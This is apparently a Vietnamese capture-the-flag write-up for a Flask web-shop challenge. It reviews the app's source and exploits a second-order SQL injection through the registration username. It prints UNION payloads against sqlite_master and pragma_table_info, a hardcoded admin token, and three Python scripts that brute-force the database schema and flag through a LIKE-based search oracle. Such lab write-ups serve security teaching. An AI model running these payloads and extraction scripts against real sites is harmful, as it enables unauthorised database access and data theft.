# 10shi

## Description:
Mình đã tạo ra 1 trang web mua sắm. Sâu bên trong, mình đã đặt kho báu vô cùng quý giá. Liệu bạn, các nhà thám hiểm tài ba, có thể khám phá bí mật mà dành lấy khó báu không

***P/s***: Tấm "bản đồ" mình đưa cho bạn không hề có "đích đến" và còn rất nhiều "bí mật" được ẩn giấu

## Phân tích:
Ta nhìn qua các route của ```app.py```:     

-Đầu tiên chức năng chức năng login, khi đăng nhập thành công (username tồn tại trong database) 1 ```jwt_token``` được tạo với payload ```{"username": username}```, secret_key lấy từ ```env```, mã hóa ```HS256``` 
```bash
SECRET_KEY = os.environ.get("SECRET_KEY", "test")
app.secret_key = SECRET_KEY
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        user = get_user(username)
        if user:
            stored_password = user[2]  
            if password == stored_password:
                token = jwt.encode({"username": username}, app.secret_key, algorithm="HS256")
                resp = make_response(redirect("/dashboard"))
                resp.set_cookie("token", token, httponly=False, samesite="Lax")
                return resp
            return render_template("login.html", message="Invalid password")
        else:
            return render_template("login.html", message="User not found")
    else:
        return render_template("login.html")
```

-```register()``` khi kết nối tới database đã được parameterize nên cũng không có gì hấp dẫn:

```bash
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT username FROM users WHERE username=?", (username,))
        result = cursor.fetchone()
        conn.close()

        if not result:
            add_user(username, password)
            token = jwt.encode({"username": username}, app.secret_key, algorithm="HS256")
            resp = make_response(redirect("/dashboard"))
            resp.set_cookie("token", token, httponly=False, samesite="Lax")
            return resp
        else:
            return render_template("login.html", message="User is existed")
```

-```secure_file()``` đầu tiên chia filename ra thành các part sau đó lấy extension là part thứ 2, nếu có nhiều hơn 1 dấu '.' thì extension = "", đồng thời nó cũng filter hết các charector nguy hiểm nên ta loại bỏ khả năng path traversal:

```python
UPLOAD_FOLDER = os.path.join(app.root_path, "uploads")
def secure_file(filename):
    parts = filename.rsplit(".", 1)  
    name = parts[0]
    extension = parts[1] if len(parts) == 2 else ""
    # No path traversal
    unsecure_characters = "./\\%+&^$#@!`~[]<>|;:,?*"
    for char in unsecure_characters:
        name = name.replace(char, "")
        extension = extension.replace(char, "")
    return f"{name}.{extension}" if extension else name

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    filename = secure_file(filename)
    return send_from_directory(UPLOAD_FOLDER, filename)
```

-Mình để ý 3 route ```/dashboard```, ```/product/<id>```, ```/search``` gọi tới 3 hàm trong db đều có dạng ```SELECT * FROM ... AND public = 1```     
==> **Có thể có product đã bị ẩn đi (AND public = 0)**  (1)

```python
@app.route("/dashboard")
@auth_check
def dashboard():
    result=get_all_product()
    return render_template("dashboard.html", result=result, user = get_user_from_session())

@app.route("/product/<id>")
@auth_check
def product_detail(id):
    result=get_product(id)
    return render_template("product_detail.html", result=result, user=get_user_from_session())

@app.route("/search")
@auth_check
def search():
    query=request.args.get("query", "")
    result=search_product(query)
    return render_template("search.html", result=result, query=query, user=get_user_from_session())
```

-```edit_profile``` có chức năng chức upload file avatar rồi lưu vào ```/uploads/file_name``` nhưng như đã nói ở trước đó, traversal ở đây không khả thi.    

```python
ALLOWED_IMAGE_EXTENSIONS = {"png", "jpg", "jpeg", "gif"}

def allowed_image_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_IMAGE_EXTENSIONS

def upload_image(file):
    if file and allowed_image_file(file.filename):
        filename = f"{uuid.uuid4().hex[0:12]}_{secure_file(file.filename)}"
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)
        return filename
    return None

@app.route("/edit_profile", methods=["GET", "POST"])
@auth_check
def edit_profile():
    user = get_user_from_session()
    if request.method == "POST":
        email = request.form.get("email")
        phone = request.form.get("phone")
        avatar_file = request.files.get("avatar")
        if avatar_file and avatar_file.filename:  
            image_filename = upload_image(avatar_file)
            if not image_filename:
                return render_template("edit_profile.html", user=get_user_from_session(), message="Invalid image file")
            avatar_url = "/uploads/" + image_filename
            delete_avatar_image(user[1])  
        else:
            avatar_url = user[6]
        edit_user(user[0], email, phone, avatar_url)
        return render_template("edit_profile.html", user=get_user_from_session(), message="Profile updated successfully")
    return render_template("edit_profile.html", user=user)
```

Thử xem trong ```database.py```, hàm ```edit_user()``` thực hiện: ```cursor.execute("UPDATE users SET email=?, phone=?, avatar_url=? WHERE id=?", (email, phone, avatar_url, id))```

==>Không thể khai thác SQLi ở đây.

-```/buy_product()``` được thực hiện khi mình mua hàng, nó gửi 1 request POST với data là ```product_id``` và ```number```, thực hiện gọi hàm ```buying_product()``` trong database để check xem liệu có đủ tiền để mua không:

```python
@app.route("/buy_product", methods=["GET", "POST"])
@auth_check
def buy_product():
    if request.method == "POST":
        try:
            username = get_user_from_session()[1]
            product_id = request.form.get("product_id")
            number = int(request.form.get("number", 1))
            is_sucess = buying_product(username, product_id, number)
            if is_sucess:
                return render_template("product_detail.html", result=get_product(product_id), message="Sucessfully bought product", user=get_user_from_session())
            else:
                return render_template("product_detail.html", result=get_product(product_id), message="Not enough money or product not found", user=get_user_from_session())
        except Exception:
             return render_template("product_detail.html", result=get_product(product_id), message="Something when wrong", user=get_user_from_session())
    return render_template("product_detail.html", result=get_product(product_id), user=get_user_from_session())
```

Hàm ```buying_product()```:    
```SQL
def buying_product(username, product_id, number):
    conn = get_db_connection()
    cursor = conn.cursor()
    try: 
        cursor.execute("SELECT money FROM users WHERE username=?", (username,))
        user = cursor.fetchone()
        if not user:
            conn.close()
            return False
        user_money = user[0]

        cursor.execute("SELECT price FROM products WHERE id=?", (product_id,))
        row = cursor.fetchone()
        if not row:
            conn.close()
            return False
        product_price = row[0]
        
        if user_money >= product_price * number and number > 0:
            new_money = user_money - product_price * number
            cursor.execute("UPDATE users SET money=? WHERE username=?", (new_money, username))
            cursor.execute(f"INSERT INTO orders (username, product_id, quantity) VALUES ((SELECT username FROM users WHERE username='{username}'), ?, ?)", (product_id, number))
            conn.commit()
            conn.close()
            return True
        else:
            conn.close()
            return False
    except sqlite3.Error as e:
        print(f"Database error: {e}")
        conn.close()
        return False
```

+Ta để ý ở đoạn check user_money, nó thực hiện 1 lệnh khá nguy hiểm:    

```SQL
cursor.execute(f"INSERT INTO orders (username, product_id, quantity) VALUES ((SELECT username FROM users WHERE username='{username}'), ?, ?)", (product_id, number))
```

Cụ thể, column username được gán trực tiếp cho biến username (tên của user nhập vào)    

==>**Có thể SQLi ở đây!**    (2)         

-```/order_history``` cho phép xem lịch sử mua hàng của user hiện tại bằng cách thực hiện query:     

```SQL
    cursor.execute("""
        SELECT p.name, o.quantity, p.price, (o.quantity * p.price) AS total_price
        FROM orders o
        JOIN users u ON o.username = u.username
        JOIN products p ON o.product_id = p.id
        WHERE u.id = ?
    """, (id,))
```

```python
@app.route("/order_history", methods=["GET"])
@auth_check
def order_history():
    user = get_user_from_session()
    orders = get_order_history(user[0])
    return render_template("order_history.html", orders=orders, user=user)
```

==>Không có gì đặc biệt     

### Xét tới các chức năng của **admin**

-```/admin``` gọi hàm ```get_all_users()``` trong db hiển thị cho ta tất cả user có trong db

```python
@app.route("/admin")
@is_admin
def admin_dashboard():
    users = get_all_users()
    return render_template("admin/admin_dashboard.html", users=users, user=get_user_from_session())
```

-```admin/add_product``` cho phép admin tạo 1 product, nhưng giá của nó phải lớn hơn 0, mà tài khoản của mình mặc định là 0 đồng :)) 

```python
@app.route("/admin/add_product", methods=["GET", "POST"])
@is_admin
def add_product_route():
    if request.method == "POST":
        name = request.form.get("name", "test product").strip()

        # Validate price input
        price_str = request.form.get("price", "0.00").strip()
        if not price_str.replace(".", "", 1).isdigit():
            return render_template("admin/add_product.html", user=get_user_from_session(), message="Invalid price")
        elif float(price_str) <= 0:
            return render_template("admin/add_product.html", user=get_user_from_session(), message="Price must be greater than 0")

        price = float(price_str)

        # Handle image upload
        image_filename = upload_image(request.files.get("uploaded_image"))
        if image_filename:
            image_url = "/uploads/"+image_filename
        else:
            return render_template("admin/add_product.html", user=get_user_from_session(), message="Invalid image file")

        description = request.form.get("description")
        add_product(name, price, image_url, description)
        return redirect("/admin/products")
    return render_template("admin/add_product.html", user=get_user_from_session())
```

-```/admin/order_history``` thực hiện gọi hàm ```get_all_orders()``` cho phép hiển thị tất cả các lịch sử mua hàng của tất cả các user.     **(3)**

```python
@app.route("/admin/order_history", methods=["GET"])
@is_admin
def admin_order_history():
    user = get_user_from_session()
    orders = get_all_orders()
    return render_template("admin/admin_order_history.html", orders=orders, user=user)
```

Hàm ```get_all_orders()```:    

```python
def get_all_orders():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT o.id, o.username, p.name, o.quantity, p.price, (o.quantity * p.price) AS total_price
        FROM orders o
        JOIN users u ON o.username = u.username
        JOIN products p ON o.product_id = p.id
    """)
    result = cursor.fetchall()
    conn.close()
    return result
```

-```/admin/search_order_history``` gửi 1 request GET chứa 2 parameter là ```category``` và ```search_text```, hàm ```get_order_base_on()``` nhận 2 tham số ```input``` - Chuỗi bạn muốn tìm và ```type``` - xác định kiểu tìm theo username hay product

```python
def get_order_base_on(input, type):
    conn = get_db_connection()
    cursor = conn.cursor()

    if type == "username":
        cursor.execute("""
            SELECT p.name, o.quantity, p.price, (o.quantity * p.price) AS total_price
            FROM orders o
            JOIN products p ON o.product_id = p.id
            WHERE o.username LIKE ?
        """, (f"%{input}%",))

    elif type == "product":
        cursor.execute("""
            SELECT u.username, o.quantity, p.price, (o.quantity * p.price) AS total_price
            FROM orders o
            JOIN users u ON o.username = u.username
            JOIN products p ON o.product_id = p.id
            WHERE p.name LIKE ?
        """, (f"%{input}%",))

    result = cursor.fetchall()
    conn.close()
    return result

@app.route("/admin/search_order_history", methods=["GET"])
@is_admin
def admin_search_order_history():
    category = request.args.get("category", "")
    search_text = request.args.get("search_text", "")
    current_user = get_user_from_session()
    if category not in ("username", "product"):
        return render_template("admin/admin_search_order.html",message="Category must be username or product", user=current_user)
    orders = get_order_base_on(search_text, category)
    return render_template("admin/admin_search_order.html", orders=orders, user=current_user, category = category, search_text = search_text)
```

--->Nhận xét: Ở đây hàm ```get_order_base_on()``` thực hiện query chứa mệnh đề LIKE - Tức là ta có thể sử dụng **Wildcard charector** trong input (tức là ```search_text()```) **(4)**


-```/admin/tester``` có 2 method ta chú ý,    
+ Khi ta gửi request ```GET /admin/tester?action=env``` nó sẽ trả về ```os.environ``` mà ở trên ta phân tích thì os.environ chứa ```SECRET_KEY```      
+ Khi ta gửi     
```bash
POST /admin/tester?action=add_money
Content-Type: application/x-www-form-urlencoded
username={username}&amount=100
```

tương đương với việc cộng tiền vào tài khoản {username}.     (5)

```python
@app.route("/admin/tester", methods=["GET", "POST"])
@is_admin
def admin_logs():
    action = request.args.get("action")
    if action == "healthcheck":
        return "OK", 200
    elif action == "env":
        return str(os.environ), 200
    elif action == "add_money":
        username = request.form.get("username")
        amount = int(request.form.get("amount"))
        try: 
            if is_user_exist(username) and amount>0: 
                add_money(username, amount)
                return "Add money successfull", 200
            else:
                return "User not exist or amount <= 0", 400
        except Exception:
            return "Error ocococ", 404
    else:
        return "What should tenshi do now", 400
```

-Từ các manh mối ở trên, có thể đoán rằng flag đang nằm ở đâu đó trong database

## Thực hiện: 
-Ở **(2)**, ta đã xác nhận được rằng sẽ có SQLi ở ```/buy_product``` trong biến username, query ban đầu:    
```INSERT INTO orders (username, product_id, quantity) VALUES ((SELECT username FROM users WHERE username='{username}'), ?, ?)```

-Nếu ta đặt username kiểu dạng như: ```' UNION SELECT 'prochicken' FROM users WHERE username = 'admin' AND password LIKE '%``` thì câu query sẽ thành:

```sql
INSERT INTO orders (username, product_id, quantity) 
VALUES
((SELECT username FROM users WHERE username=''
UNION
SELECT 'prochicken' FROM users WHERE username = 'admin' AND password LIKE '%'), ?, ?)
```



+Ở đây ta lợi dụng Wildcard charector để thử UNION attack lần lượt lấy các kí tự trong password của admin: [wildcard_char](http://fw3schools.com/sql/sql_wildcards.asp)

+Lưu ý phải mua 1 sản phẩm khả năng mua được để nó thực hiện truy vấn vào database nhưng ta lại không có xu nào cả nên hãy nhớ lại suy đoán (1) của mình, có thể có product_id nào đó đang được kí với public = 0, ta thử với product_id = 5:     

![alt text](image/buy_product.png)

-Sau đó vào lại tài khoản 'prochicken' kiểm tra ```/order_history```:    

![alt text](image/order_his.png) 

==>OK, payload hoạt động, tức là product_id = 5 đã bị ẩn đi nhưng ta vẫn có thể mua được nó, có thể trong database.py, products_data đầy đủ sẽ là:    

```sql
products_data = [
        ("Laptop", 1.20, "/static/laptop.jpg", "This is a basic laptop", 1),
        ("Phone", 8.99, "/static/phone.jpg", "This is a basic phone", 1),
        ("Tablet", 30.00, "/static/tablet.jpg", "This is a very basic tablet of HOLACTF", 1),
        ("FLAG", 10000, "/static/flag.jpg", "EHCTF{Leak_the_flag}", 1),
        ("Beta_product", 0, "/static/...", "...", 0)
    ]
```

-Mình tóm gọn lại workflow tìm password như sau:    
```Register   ---> Buy-product  --->   order_history ---> Check ```

```bash
POST /register HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Cookie: token=...
username=***payload***&password=123
```

```bash
POST /buy_product HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Cookie: token=...
product_id=5&number=1
```

```bash
GET /order_history HTTP/1.1
Cookie: token=...
```

-Ta có script tìm password và lấy admin_token: <a href="find_pwd.py">Script admin password nhe</a>

-Sau khi đã xác định được admin password, ta sẽ giải quyết việc tìm thử các table có trong database dựa vào việc inject 1 query khác, đọc các method ở đây [SQLite injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

-Ta thử payload: ```' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'```, nhưng vấn đề là sau khi inject thành công thì ta có thể xem kết quả inject ở đâu?     

==> Cùng nhìn lại giả thiết (4):

```sql
if type == "username":
        cursor.execute("""
            SELECT p.name, o.quantity, p.price, (o.quantity * p.price) AS total_price
            FROM orders o
            JOIN products p ON o.product_id = p.id
            WHERE o.username LIKE ?
        """, (f"%{input}%",))
```

Ta có thể lợi dụng parameter search_text - input để lấy ra column username trong table ```orders``` mà ta inject ở query:    
```sql
INSERT INTO orders (username, product_id, quantity)
VALUES (
    (SELECT username FROM users WHERE username='' 
     UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table),
    ?, ?
)
```

==> Vậy điều kiện true ở đây là ta ta inject payload vào và nếu search vẫn ra product mà ta vừa mua thì tức là đã thành công!     

-Đầu tiên ta sẽ tạo 1 user với tên: ```' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table```, sau đó gửi request (Với token_admin ta lấy được ở bước trên):    

![alt text](image/add_money.png)

-Sau đó quay lại website, đặt mua 1 product rồi quay lại user admin, vào ```/admin/search_order_history```, với 2 parameter ```?category=username&search_text=flag%```, ta xem response trả về:     

![alt text](image/confirm_vul.png)

==>Ta thấy nó trả về 1 giá trị - là giá trị mình vừa trigger SQLi 

==>Giờ ta chỉ cần brute-force để tìm ra table của database thôi!

```python
import requests
import string

URL = "http://127.0.0.1:5000"
admin_tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.F5LymIXr29umPedMOVxMbYgtktSy96AwF9dKtP9CyYw" 
CHARSET = string.ascii_lowercase + string.digits + "{}/\-_"

def search_order_history(search_text):
    endpoint = "/admin/search_order_history"
    cookies = {"token": admin_tok}
    params = {
        "category": "username",
        "search_text": search_text
    }
    response = requests.get(URL + endpoint, cookies=cookies, params=params)
    return response.text

def is_correct_table(search_text):
    response_text = search_order_history(search_text)
    if "<td>1</td>" in response_text and "<td>Laptop</td>" in response_text:
        return True
    return False

def brute_force_flag_table():
    table_name = "flag"
    while True:
        found_char = False
        for char in CHARSET:
            test_text = table_name + char + "%"
            if is_correct_table(test_text):
                table_name += char
                found_char = True
                print(f"[+] Found character: {char} | Current table name: {table_name}")
                break
        if not found_char:

            break
    return table_name

if __name__ == "__main__":
    flag_table = brute_force_flag_table()
    print(f"[+] Flag table name: {flag_table}")
```

--> Ta tìm được 1 table tên: ```flag_table_secret```    

-Tiếp theo, ta tạo 1 account để extract column trong table ```flag_table_secret``` này với username:     
```' UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('flag_table_secret') WHERE name LIKE 'f%```

payload này khi được trigger SQLi sẽ gộp tất cả các cột của table ```flag_table_secret``` vào username, sau đó ta thực hiện brute-force bằng cách search như trên:    

![alt text](image/image.png)

```python
import requests
import string

URL = "http://127.0.0.1:5000"
admin_tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.F5LymIXr29umPedMOVxMbYgtktSy96AwF9dKtP9CyYw" 
CHARSET = string.ascii_lowercase + string.digits + "{}/\-_"

def search_order_history(search_text):
    endpoint = "/admin/search_order_history"
    cookies = {"token": admin_tok}
    params = {
        "category": "username",
        "search_text": search_text
    }
    response = requests.get(URL + endpoint, cookies=cookies, params=params)
    return response.text

def is_correct_column(search_text):
    response_text = search_order_history(search_text)
    if "<td>1</td>" in response_text and "<td>Phone</td>" in response_text:
        return True
    return False

def brute_force_flag_column():
    column_name = "f"
    while True:
        found_char = False
        for char in CHARSET:
            test_text = column_name + char + "%"
            if is_correct_column(test_text):
                column_name += char
                found_char = True
                print(f"[+] Found character: {char} | Current column : {column_name}")
                break
        if not found_char:

            break
    return column_name

if __name__ == "__main__":
    flag_table = brute_force_flag_column()
    print(f"[+] Flag column: {flag_table}")
```

==> Ta tìm được 1 column tên ```flag_value``` có thể đây chính là flag mà ta cần tìm!!

-Tạo 1 payload khác để lấy flag: ```' UNION SELECT flag_value FROM flag_table_secret WHERE flag_value LIKE 'HOLACTF{%```   

```python
import requests
import string

admin_tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.F5LymIXr29umPedMOVxMbYgtktSy96AwF9dKtP9CyYw"
URL = "http://127.0.0.1:5000"
CHAR_SET = string.digits + string.ascii_letters + "{}-_\/"

def search_order_history(search_text):
    endpoint = "/admin/search_order_history"
    cookies= {"token": admin_tok}
    params={
        "category":"username",
        "search_text":search_text
    }
    response = requests.get(URL + endpoint, params=params, cookies=cookies)
    return response.text
    
def is_true_char(search_text):
    response_text = search_order_history(search_text)
    if "<td>1</td>" in response_text and "<td>FLAG</td>" in response_text:
        return True
    return False

def finding_flag():
    flag = "HOLACTF{"
    while True:
        found_char = False
        for char in CHAR_SET:
            test_text = flag + char + "%"
            if(is_true_char(test_text)):
                flag += char
                found_char = True
                print(f"[+] Found character: {char} | Current flag : {flag}")
                break
        if not found_char:
            break
    return flag

if __name__ == "__main__":
    FLAG = finding_flag()
    print(f"------------------FLAG is: {FLAG}-------------------------")
```

==>THE END

